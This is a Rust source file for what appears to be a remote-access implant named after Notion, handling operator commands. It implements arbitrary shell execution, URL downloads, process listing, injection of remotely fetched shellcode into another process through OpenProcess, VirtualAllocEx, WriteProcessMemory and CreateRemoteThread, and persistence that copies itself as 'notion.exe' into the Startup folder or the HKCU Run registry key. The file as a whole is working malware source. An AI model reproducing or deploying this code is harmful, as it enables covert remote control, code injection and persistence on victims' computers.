#[cfg(windows)] extern crate winapi;
#[cfg(windows)] extern crate kernel32;
#[cfg(windows)] extern crate winreg;
#[cfg(windows)] use std::ptr;
use serde_json::to_string as json_to_string;
use std::error::Error;
use std::result::Result;
use std::io::copy;
use std::fmt;
use std::path::Path;
use std::fs::{write, File, copy as fs_copy};
use std::env::{set_current_dir, current_dir, var, args};
use std::process::Command;
use reqwest::{Client};
#[cfg(windows)] use winreg::{RegKey};
#[cfg(windows)] use winreg::enums::HKEY_CURRENT_USER;
use crate::config::ConfigOptions;

#[cfg(windows)]  use winapi::um::winnt::{PROCESS_ALL_ACCESS,MEM_COMMIT,MEM_RESERVE,PAGE_EXECUTE_READWRITE};

pub enum CommandType {
    Cd(String),
    Shell(String),
    Download(String),
    Ps,
    Pwd,
    Inject(String),
    Save(String),
    Persist(String),
    Shutdown,
    Unknown
}
#[derive(Debug)]
struct CommandError(String);

impl fmt::Display for CommandError {
    fn fmt(&self, f: &mut fmt::Formatter) -> fmt::Result {
        write!(f, "{}", self.0)
    }
}

impl Error for CommandError {}

pub struct NotionCommand {
    pub commmand_type: CommandType,
}

impl NotionCommand {
    pub fn from_string(command_str: String) -> Result<NotionCommand, Box <dyn Error>> {
        let mut command_words = command_str.split(" ");
        // Taking the first command advances the iterator, so the remaining 
        // items should be the command data.
        // The call to this function clears the target emoji
        // TODO: Maybe do that here?
        if let Some(t) = command_words.nth(0) {
            let command_string = String::from(
                command_words.collect::<Vec<&str>>()
                .as_slice()
                .join::<&str>(" ")
            );
            let command_type: CommandType = match t {
                "shell"    => CommandType::Shell(command_string),
                "cd"       => CommandType::Cd(command_string),
                "download" => CommandType::Download(command_string),
                "ps"       => CommandType::Ps,
                "pwd"      => CommandType::Pwd,
                "inject"   => CommandType::Inject(command_string),
                "save"     => CommandType::Save(command_string),
                "persist"  => CommandType::Persist(command_string),
                "shutdown" => CommandType::Shutdown,
                _          => CommandType::Unknown
            };
            return Ok(NotionCommand { commmand_type:command_type});

        } else {
            return Err(Box::new(CommandError("Could not parse command!".to_string())));
        }
    }

    pub async fn handle(&self, config_options: &mut ConfigOptions) -> Result<String, Box <dyn Error>> {
        match &self.commmand_type {
            CommandType::Cd(s) => {
                let new_path = Path::new(s.trim());
                match set_current_dir(new_path) {
                    Ok(_) => Ok(format!("Changed to {s}").to_string()),
                    Err(e) => Ok(e.to_string())
                }
            },
            CommandType::Shell(s) => {
                let output = if cfg!(target_os = "windows") {
                    Command::new("cmd")
                        .arg("/c")
                        .arg(s)
                        .output()
                        .expect("failed to execute process")
                } else {
                    Command::new("/bin/bash")
                        .arg("-c")
                        .arg(s)
                        .output()
                        .expect("failed to execute process")
                };
                let output_string: String;
                if output.stderr.len() > 0 {
                    output_string = String::from_utf8(output.stderr).unwrap();
                } else {
                    output_string = String::from_utf8(output.stdout).unwrap();
                }
                return Ok(output_string);
            },
            CommandType::Download(s) => {
                let client = Client::new();
                // Get args
                let mut args = s.split(" ");
                // Get URL as the first arg
                let url = args.nth(0).unwrap();
                // Get path as the 2nd arg or the last part of the URL
                let path = args.nth(0).unwrap_or_else(|| url.split("/").last().unwrap());
                let r = client.get(s).send().await?;
                if r.status().is_success() {
                    let mut out_file = File::create(path).expect("Failed to create file");
                    match copy(&mut r.bytes().await?.as_ref(), &mut out_file) {
                        Ok(b)  => { return Ok(format!("{b} bytes written to {path}").to_string());},
                        Err(_) => { return Ok("Could not write file".to_string())}
                    }
                }
                return Ok(r.text().await?);
            },
            CommandType::Ps => {
                // This is a lame kludge because getting process data is tough, but at least
                // it's ergonomic?
                let output = if cfg!(target_os = "windows") {
                    Command::new("cmd")
                        .args(["/c", "tasklist"])
                        .output()
                        .expect("failed to execute process")
                } else {
                    Command::new("sh")
                        .arg("-c")
                        .args(["ps", "aux"])
                        .output()
                        .expect("failed to execute process")
                };
                let output_string: String;
                if output.stderr.len() > 0 {
                    output_string = String::from_utf8(output.stderr).unwrap();
                } else {
                    output_string = String::from_utf8(output.stdout).unwrap();
                }
                return Ok(output_string);
            },
            CommandType::Pwd => {
                match current_dir() {
                    Ok(b) => Ok(String::from(b.to_str().unwrap())),
                    Err(e) => Ok(format!("{e}").to_string())
                }
            },
            #[cfg(windows)]
            CommandType::Inject(s) => {
                // Input: url to shellcode -p pid
                let mut args = s.split(" ");
                // Get URL as the first arg
                let url = args.nth(0).unwrap();
                // Get path as the 2nd arg or the last part of the URL
                if let Some(p) = args.nth(0) {
                    println!("Injecting into PID {:?}", p);
                    let pid: u32 = p.parse()?;
                    let client = Client::new();
                    let r = client.get(url).send().await?;
                    if r.status().is_success() {
                        // Here comes the injection
                        let shellcode = r.bytes().await?;
                        // Big thanks to trickster0
                        // https://github.com/trickster0/OffensiveRust/tree/master/Process_Injection_CreateThread
                        unsafe {
                            let h = kernel32::OpenProcess(PROCESS_ALL_ACCESS, winapi::shared::ntdef::FALSE.into(), pid);
                            let addr = kernel32::VirtualAllocEx(h, ptr::null_mut(), shellcode.len() as u64, MEM_COMMIT | MEM_RESERVE,PAGE_EXECUTE_READWRITE);
                            let mut n = 0;
                            kernel32::WriteProcessMemory(h,addr,shellcode.as_ptr() as  _, shellcode.len() as u64,&mut n);
                            let _h_thread = kernel32::CreateRemoteThread(h, ptr::null_mut(), 0 , Some(std::mem::transmute(addr)), ptr::null_mut(), 0, ptr::null_mut());
                            kernel32::CloseHandle(h);
                        }
                        return Ok("Injection completed!".to_string());
                    } else {
                        return Ok("Could not download shellcode".to_string());
                    }
                    
                } else {
                    return Ok("No valid pid provided".to_string());
                }
                
            }
            #[cfg(not(windows))]
            CommandType::Inject(_s) => {
                Ok("Can only inject shellcode on Windows!".to_string())
            }
            CommandType::Save(s) => {
                if !s.is_empty() {
                    config_options.config_file_path = s.to_string();
                }
                write(config_options.config_file_path.trim(), json_to_string(config_options)?)?;
                Ok(format!("Config file saved to {s}").to_string())
            },
            CommandType::Persist(s) => {
                #[cfg(windows)]
                // `persist [method] [args]`
                match s.trim() {
                    "startup" => {
                        // Get user
                        if let Ok(v) = var("APPDATA") {
                            let mut persist_path: String = v;
                            persist_path.push_str(r"\Microsoft\Windows\Start Menu\Programs\Startup\notion.exe");
                            let exe_path = args().nth(0).unwrap();
                            println!("{exe_path}");
                            // let mut out_file = File::create(path).expect("Failed to create file");
                            match fs_copy(&exe_path, &persist_path) {
                                Ok(b)  => { return Ok(format!("{b} bytes written to {persist_path}").to_string());},
                                Err(e) => { return Ok(e.to_string())}
                            }
                        } else {
                            return Ok("Couldn't get APPDATA location".to_string());
                        };
                    },
                    "registry" => {
                        if let Ok(v) = var("LOCALAPPDATA") {
                            let mut persist_path: String = v;
                            persist_path.push_str(r"\notion.exe");
                            let exe_path = args().nth(0).unwrap();
                            println!("{exe_path}");
                            // let mut out_file = File::create(path).expect("Failed to create file");
                            fs_copy(&exe_path, &persist_path)?;
                            let hkcu = RegKey::predef(HKEY_CURRENT_USER);
                            let path = Path::new(r"Software\Microsoft\Windows\CurrentVersion\Run");
                            let (key, disp) = hkcu.create_subkey(&path)?;
                            match disp {
                                REG_CREATED_NEW_KEY => println!("A new key has been created"),
                                REG_OPENED_EXISTING_KEY => println!("An existing key has been opened"),
                            };
                            key.set_value("Notion", &persist_path)?;
                            Ok("Persistence accomplished".to_string())
                        } else {
                            Ok("LOCALDATA undefined".to_string())
                        }
                    },
                    _ => Ok("That's not a persistence method!".to_string())                    
                }
                #[cfg(not(windows))]
                Ok("Windows only!".to_string())
        
            },
            CommandType::Shutdown => {
                Ok(String::from("Shutting down"))
            },
            CommandType::Unknown => {
                Ok(String::from("Unknown command type"))
            }
        }
    }
}